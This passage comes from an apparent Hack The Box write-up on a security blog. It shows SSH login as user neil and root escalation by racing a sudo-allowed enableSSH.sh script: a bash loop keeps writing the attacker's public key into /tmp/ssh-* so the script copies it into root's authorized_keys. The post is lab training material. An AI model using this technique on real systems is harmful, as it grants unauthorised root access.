layout="responsive"></amp-img></figure><p>Now we can use the ☝ above credentials to login as user <code>neil</code> via SSH. Then you have the user.txt.</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-318.png" class="kg-image" alt width="1772" height="1324" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-318.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-318.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-318.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-318.png 1772w" layout="responsive"></amp-img></figure><hr></hr><h2 id="03-privilege-escalation">03. Privilege Escalation</h2><p>For privilege escalation, usually I run the <code>sudo-l</code> command first to know what commands we can run as super user without prompting the super user password.</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-319.png" class="kg-image" alt width="1730" height="478" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-319.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-319.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-319.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-319.png 1730w" layout="responsive"></amp-img></figure><p>As shown, there is a bash file located in <code>/usr/local/bin/enableSSH.sh</code> Let's check the file permission first.</p><pre><code class="language-bash">ls -al /usr/local/bin/enableSSH.sh</code></pre><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-320.png" class="kg-image" alt width="1510" height="294" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-320.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-320.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-320.png 1510w" layout="responsive"></amp-img></figure><p>We have permission only to <code>read and execute</code>  on this file. Let's check what's inside that file. 🧐</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-321.png" class="kg-image" alt width="2334" height="1508" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-321.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-321.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-321.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-321.png 2334w" layout="responsive"></amp-img></figure><p>While analyzing the source I found a pretty interesting function called <strong>addKey().</strong></p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-322.png" class="kg-image" alt width="1500" height="588" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-322.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-322.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-322.png 1500w" layout="responsive"></amp-img></figure><p>Simply what it does is, the script reads the content of the file in <code>/tmp/ssh-xxxxxx</code> and adds it to the <code>/root/.ssh/authorized_keys</code> . If we can add our SSH public key to the <code>/tmp/ssh-XXXXXX</code> ; we can login to the machine as root via our private key.</p><p>In doing so, I need to have SSH key pair. Let's generate it right now. Type <code>ssh-keygen</code> and hit enter.</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-323.png" class="kg-image" alt width="1894" height="1030" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-323.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-323.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-323.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-323.png 1894w" layout="responsive"></amp-img></figure><p>Then we need to write our public key to the <code>/tmp/ssh-*</code> continuously. We can do that using a simple bash loop. Change<strong> &lt;Your_id_rsa.pub&gt; </strong>as yours.</p><pre><code class="language-bash">while true
+do 
+echo 'ssh-rsa AAAAB**&lt;Your_id_rsa.pub&gt;***p1c=' |tee /tmp/ssh-*
+done</code></pre><p>Now let's move on to the final step 😅. I divided my terminal into 3 parts. The top one is to run the loop script, the second one is to execute the enableSSH.sh script and the last one is to login as root via my private key.</p><p>After all, run the loop script, then again run the <strong>enableSSH.sh</strong> script and try to login as root via SSH.</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-324.png" class="kg-image" alt width="1319" height="746" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-324.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-324.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-324.png 1319w" layout="responsive"></amp-img></figure><p>PWN3D! 🥳 Now we have the root flag.</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-325.png" class="kg-image" alt width="1390" height="294" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-325.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-325.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-325.png 1390w" layout="responsive"></amp-img></figure><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-326.png" class="kg-image" alt width="851" height="766" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-326.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-326.png 851w" layout="responsive"></amp-img></figure><p>I still wonder why this box was given such a name, don't you??</p><figure class="kg-card kg-image-card"><amp-img src="https://h4rithd.com/blog/content/images/2021/06/image-327.png" class="kg-image" alt width="761" height="318" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-327.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-327.png 761w" layout="responsive"></amp-img></figure><p><br />Anyway... I’ll see you on the next retired machine, Ciao!! 😉😉</p><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p><p></p><p></p><p></p><p></p>
+
+            </section>
+
+        </article>
+    </main>
+    <footer class="page-footer">
+            <amp-img class="site-icon" src="https://h4rithd.com/blog/content/images/2021/06/favicon.ico" width="50" height="50" layout="fixed"></amp-img>
+        <h3>h4rithd.com</h3>
+            <p>Penetration Tester | Ethical Hacker | Security Researcher</p>
+        <p><a href="../../index.html">Read more posts →</a></p>
+        <a class="powered" href="https://ghost.org" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 156 156"><g fill="none" fill-rule="evenodd"><rect fill="#15212B" width="156" height="156" rx="27"/><g transform="translate(36 36)" fill="#F6F8FA"><path d="M0 71.007A4.004 4.004 0 014 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0130 84H4a4 4 0 01-4-4.007v-8.986zM50 71.007A4.004 4.004 0 0154 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0180 84H54a4 4 0 01-4-4.007v-8.986z"/><rect y="34" width="84" height="17" rx="4"/><path d="M0 4.007A4.007 4.007 0 014.007 0h41.986A4.003 4.003 0 0150 4.007v8.986A4.007 4.007 0 0145.993 17H4.007A4.003 4.003 0 010 12.993V4.007z"/><rect x="67" width="17" height="17" rx="4"/></g></g></svg> Published with Ghost</a>
+    </footer>
+    
+</body>
+</html>
